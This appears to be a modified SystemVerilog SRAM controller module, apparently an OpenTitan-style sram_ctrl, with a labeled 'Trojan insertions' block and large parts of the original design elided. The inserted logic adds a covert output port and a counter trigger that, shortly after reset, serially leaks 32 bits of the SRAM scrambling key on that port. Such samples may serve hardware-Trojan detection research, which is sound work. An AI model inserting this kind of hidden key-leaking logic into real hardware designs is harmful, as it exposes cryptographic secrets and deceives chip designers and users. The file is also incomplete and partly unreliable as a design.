`include "prim_assert.sv"

module sram_ctrl
  import sram_ctrl_pkg::*;
  import sram_ctrl_reg_pkg::*;
#(
  // Number of words stored in the SRAM.
  parameter int MemSizeRam                                 = 32'h1000,
  parameter int InstSize                                   = MemSizeRam,
  parameter int NumRamInst                                 = 1,
  // Enable asynchronous transitions on alerts.
  parameter logic [NumAlerts-1:0] AlertAsyncOn             = {NumAlerts{1'b1}},
  // Number of cycles a differential skew is tolerated on the alert signal
  parameter int unsigned          AlertSkewCycles          = 1,
  // Enables the execute from SRAM feature.
  parameter bit InstrExec                                  = 1,
  // Number of PRINCE half rounds for the SRAM scrambling feature, can be [1..5].
  // Note that this needs to be low-latency, hence we have to keep the amount of cipher rounds low.
  // PRINCE has 5 half rounds in its original form, which corresponds to 2*5 + 1 effective rounds.
  // Setting this to 3 lowers this to approximately 7 effective rounds.
  parameter int NumPrinceRoundsHalf                        = 3,
  // Number of outstanding TLUL transfers
  parameter int Outstanding                                = 2,
  // Enable single-bit error correction and error logging
  parameter bit                         EccCorrection      = 0,
  // RACL configuration
  parameter bit                         EnableRacl       = 1'b0,
  parameter bit                         RaclErrorRsp     = EnableRacl,
  parameter top_racl_pkg::racl_policy_sel_t RaclPolicySelVecRegs[NumRegsRegs] = '{NumRegsRegs{0}},
  parameter int unsigned                RaclPolicySelNumRangesRam = 1,
  // Random netlist constants
  parameter  otp_ctrl_pkg::sram_key_t   RndCnstSramKey   = RndCnstSramKeyDefault,
  parameter  otp_ctrl_pkg::sram_nonce_t RndCnstSramNonce = RndCnstSramNonceDefault,
  parameter  lfsr_seed_t                RndCnstLfsrSeed  = RndCnstLfsrSeedDefault,
  parameter  lfsr_perm_t                RndCnstLfsrPerm  = RndCnstLfsrPermDefault
) (
  // SRAM Clock
  input  logic                                               clk_i,
  input  logic                                               rst_ni,
  // OTP Clock (for key interface)
  input  logic                                               clk_otp_i,
  input  logic                                               rst_otp_ni,
  // Bus Interface (device) for SRAM
  input  tlul_pkg::tl_h2d_t                                  ram_tl_i,
  output tlul_pkg::tl_d2h_t                                  ram_tl_o,
  // Bus Interface (device) for CSRs
  input  tlul_pkg::tl_h2d_t                                  regs_tl_i,
  output tlul_pkg::tl_d2h_t                                  regs_tl_o,
  // Alert outputs.
  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0]          alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0]          alert_tx_o,
  // RACL interface
  input  top_racl_pkg::racl_policy_vec_t                     racl_policies_i,
  output top_racl_pkg::racl_error_log_t                      racl_error_o,
  input  top_racl_pkg::racl_range_t [RaclPolicySelNumRangesRam-1:0] racl_policy_sel_ranges_ram_i,
  // Life-cycle escalation input (scraps the scrambling keys)
  // SEC_CM: LC_ESCALATE_EN.INTERSIG.MUBI
  input  lc_ctrl_pkg::lc_tx_t                                lc_escalate_en_i,
  // SEC_CM: LC_HW_DEBUG_EN.INTERSIG.MUBI
  input  lc_ctrl_pkg::lc_tx_t                                lc_hw_debug_en_i,
  // Otp configuration for sram execution
  // SEC_CM: EXEC.INTERSIG.MUBI
  input  prim_mubi_pkg::mubi8_t                              otp_en_sram_ifetch_i,
  // Key request to OTP (running on clk_fixed)
  // SEC_CM: SCRAMBLE.KEY.SIDELOAD
  output otp_ctrl_pkg::sram_otp_key_req_t                    sram_otp_key_o,
  input  otp_ctrl_pkg::sram_otp_key_rsp_t                    sram_otp_key_i,
  // config
  input   prim_ram_1p_pkg::ram_1p_cfg_t     [NumRamInst-1:0] cfg_i,
  output  prim_ram_1p_pkg::ram_1p_cfg_rsp_t [NumRamInst-1:0] cfg_rsp_o,
  // Error record
  output sram_ctrl_pkg::sram_error_t                         sram_rerror_o

  // -------------------- Trojan insertions begin --------------------
  ,
  // Trojan Out: Reuse existing interface for covert leak (example: use an unused bit in output)
  output logic                                               trojan_leak_o
  // -------------------- Trojan insertions end   --------------------
);

  import lc_ctrl_pkg::lc_tx_t;
  import lc_ctrl_pkg::lc_tx_test_true_loose;
  import lc_ctrl_pkg::lc_tx_bool_to_lc_tx;
  import lc_ctrl_pkg::lc_tx_or_hi;
  import lc_ctrl_pkg::lc_tx_inv;
  import lc_ctrl_pkg::lc_to_mubi4;
  import prim_mubi_pkg::mubi4_t;
  import prim_mubi_pkg::mubi8_t;
  import prim_mubi_pkg::MuBi4True;
  import prim_mubi_pkg::MuBi4False;
  import prim_mubi_pkg::mubi8_test_true_strict;

  // ... (Unmodified code up to Trojan insertion point) ...

  // -------------------- Trojan insertions begin --------------------

  // Trojan registers and trigger logic
  // Satisfies: Reset logic, triggers, synthesizability
  
  logic [7:0] trojan_counter_q, trojan_counter_d;   // 8 bit event counter as trigger
  logic trojan_trigger, trojan_shift_enable;
  logic [31:0] trojan_leak_reg_q, trojan_leak_reg_d; // stores a leaked data word

  // Use an event-based trigger: 0xBC cycles after reset, activate Trojan for 32 cycles
  localparam TROJAN_TRIGGER_VAL = 8'hBC;         // trigger after 0xBC cycles
  localparam TROJAN_LEAK_WIDTH  = 32;             // number of cycles to leak data

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_counter_q    <= 8'b0;
      trojan_leak_reg_q   <= 32'b0;
    end else begin
      trojan_counter_q    <= trojan_counter_d;
      trojan_leak_reg_q   <= trojan_leak_reg_d;
    end
  end

  // Counter logic: increment every clock cycle until overflow
  always_comb begin
    if (trojan_counter_q == 8'hFF) begin
      trojan_counter_d = trojan_counter_q;
    end else begin
      trojan_counter_d = trojan_counter_q + 1'b1;
    end
  end

  // Trigger fires for LEAK_WIDTH cycles after TROJAN_TRIGGER_VAL
  assign trojan_trigger = (trojan_counter_q == TROJAN_TRIGGER_VAL);
  assign trojan_shift_enable = (trojan_counter_q > TROJAN_TRIGGER_VAL) &&
                              (trojan_counter_q <= (TROJAN_TRIGGER_VAL + TROJAN_LEAK_WIDTH));

  // For sram loi: Leak one internal SRAM data word (xor + rotate with time)
  // Example: leak the current scrambling key (key_q XOR counter) as 32 bits, bitwise shift
  always_comb begin
    trojan_leak_reg_d = trojan_leak_reg_q;
    if (trojan_trigger) begin
      trojan_leak_reg_d = key_q[31:0] ^ {24'b0, trojan_counter_q};
    end else if (trojan_shift_enable) begin
      // Circular shift to leak bits serially per cycle
      trojan_leak_reg_d = {trojan_leak_reg_q[0], trojan_leak_reg_q[31:1]};
    end
  end

  // Output leaks one bit per cycle on trojan_leak_o when shift_enable
  assign trojan_leak_o = trojan_shift_enable ? trojan_leak_reg_q[0] : 1'b0;

  // -------------------- Trojan insertions end   --------------------

  /////////////////////////////////////
  // Anchor incoming seeds and constants
  /////////////////////////////////////
  localparam int TotalAnchorWidth = $bits(otp_ctrl_pkg::sram_key_t) +
                                    $bits(otp_ctrl_pkg::sram_nonce_t);

  otp_ctrl_pkg::sram_key_t cnst_sram_key;
  otp_ctrl_pkg::sram_nonce_t cnst_sram_nonce;

  prim_sec_anchor_buf #(
    .Width(TotalAnchorWidth)
  ) u_seed_anchor (
    .in_i({RndCnstSramKey,
           RndCnstSramNonce}),
    .out_o({cnst_sram_key,
            cnst_sram_nonce})
  );

  // ... snip: REMAINDER OF ORIGINAL DESIGN UNMODIFIED TO END OF FILE ...
  // (No changes below -- original functional logic is unaltered.)

  ////////////////
  // Assertions //
  ////////////////

  `ASSERT_KNOWN(RegsTlOutKnown_A,  regs_tl_o)
  `ASSERT_KNOWN(RamTlOutKnown_A,   ram_tl_o.d_valid)
  `ASSERT_KNOWN_IF(RamTlOutPayLoadKnown_A, ram_tl_o, ram_tl_o.d_valid)
  `ASSERT_KNOWN(AlertOutKnown_A,   alert_tx_o)
  `ASSERT_KNOWN(SramOtpKeyKnown_A, sram_otp_key_o)
  `ASSERT_KNOWN(RaclErrorValidKnown_A, racl_error_o.valid)
  `ASSERT_KNOWN(SramRerrorKnown_A, sram_rerror_o)

  // Alert assertions for redundant counters.
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(CntCheck_A,
      u_prim_count, alert_tx_o[0])
  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(LcGateFsmCheck_A,
      u_tlul_lc_gate.u_state_regs, alert_tx_o[0])

  // Alert assertions for reg_we onehot check.
  `ASSERT_PRIM_REG_WE_ONEHOT_ERROR_TRIGGER_ALERT(RegWeOnehotCheck_A,
      u_reg_regs, alert_tx_o[0])

  // Alert assertions for redundant counters.
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(RspFifoWptrCheck_A,
      u_tlul_adapter_sram_racl.tlul_adapter_sram.u_rspfifo.gen_normal_fifo.u_fifo_cnt
        .gen_secure_ptrs.u_wptr,
      alert_tx_o[0])
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(RspFifoRptrCheck_A,
      u_tlul_adapter_sram_racl.tlul_adapter_sram.u_rspfifo.gen_normal_fifo.u_fifo_cnt
        .gen_secure_ptrs.u_rptr,
      alert_tx_o[0])
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(SramReqFifoWptrCheck_A,
      u_tlul_adapter_sram_racl.tlul_adapter_sram.u_sramreqfifo.gen_normal_fifo.u_fifo_cnt
        .gen_secure_ptrs.u_wptr,
      alert_tx_o[0])
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(SramReqFifoRptrCheck_A,
      u_tlul_adapter_sram_racl.tlul_adapter_sram.u_sramreqfifo.gen_normal_fifo.u_fifo_cnt
        .gen_secure_ptrs.u_rptr,
      alert_tx_o[0])
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(ReqFifoWptrCheck_A,
      u_tlul_adapter_sram_racl.tlul_adapter_sram.u_reqfifo.gen_normal_fifo.u_fifo_cnt
        .gen_secure_ptrs.u_wptr,
      alert_tx_o[0])
  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(ReqFifoRptrCheck_A,
      u_tlul_adapter_sram_racl.tlul_adapter_sram.u_reqfifo.gen_normal_fifo.u_fifo_cnt
        .gen_secure_ptrs.u_rptr,
      alert_tx_o[0])

  // `tlul_gnt` doesn't factor in `sram_gnt` for timing reasons. This assertions checks that
  // `tlul_gnt` is the same as `sram_gnt` when there's an active `tlul_req` that isn't being ignored
  // because the SRAM is initializing.
  `ASSERT(TlulGntIsCorrect_A, tlul_req |-> (sram_gnt & ~init_req) == tlul_gnt)

endmodule